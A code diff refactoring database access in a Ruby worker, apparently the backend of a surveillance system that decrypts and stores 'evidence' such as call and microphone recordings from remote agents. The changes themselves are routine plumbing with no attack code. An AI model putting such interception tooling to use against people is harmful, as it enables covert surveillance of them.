@@ -16,13 +16,11 @@ require_release 'rcs-db/connector_manager'
 require_relative 'call_processor'
 require_relative 'mic_processor'
 require_relative 'single_processor'
-require_relative 'db'
 require_relative 'statistics'
 
 require_relative 'evidence/single_evidence'
 require_relative 'evidence/audio_evidence'
 Dir[File.expand_path('../evidence/*.rb', __FILE__)].each { |path| require(path) }
-
 
 module RCS
   module Worker
@@ -70,7 +68,7 @@ module RCS
       end
 
       def db
-        RCS::Worker::DB.instance.session
+        Mongoid.session(:worker)
       end
 
       def fetch
@@ -92,7 +90,7 @@ module RCS
 
       def delete_all_evidence
         trace(:error, "[#{@agent_uid}] Agent or target is missing, deleting all related evidence")
-        RCS::Worker::GridFS.delete_by_filename(@agent_uid, "evidence")
+        RCS::DB::GridFS.delete_by_filename(@agent_uid, "evidence", :worker)
         true
       end
 
@@ -194,7 +192,7 @@ module RCS
       end
 
       def decrypt_evidence(raw_id)
-        content = RCS::Worker::GridFS.get(raw_id, "evidence") rescue nil
+        content = RCS::DB::GridFS.get(raw_id, "evidence", :worker) rescue nil
         return unless content
 
         decoded_data = ''
@@ -214,7 +212,7 @@ module RCS
       end
 
       def delete_evidence(raw_id)
-        RCS::Worker::GridFS.delete(raw_id, "evidence")
+        RCS::DB::GridFS.delete(raw_id, "evidence", :worker)
         trace(:debug, "[#{@agent_uid}] deleted raw evidence #{raw_id}")
       rescue Exception => ex
         trace(:error, "[#{@agent_uid}] Unable to delete raw evidence #{raw_id} (maybe is missing): #{ex.message}")
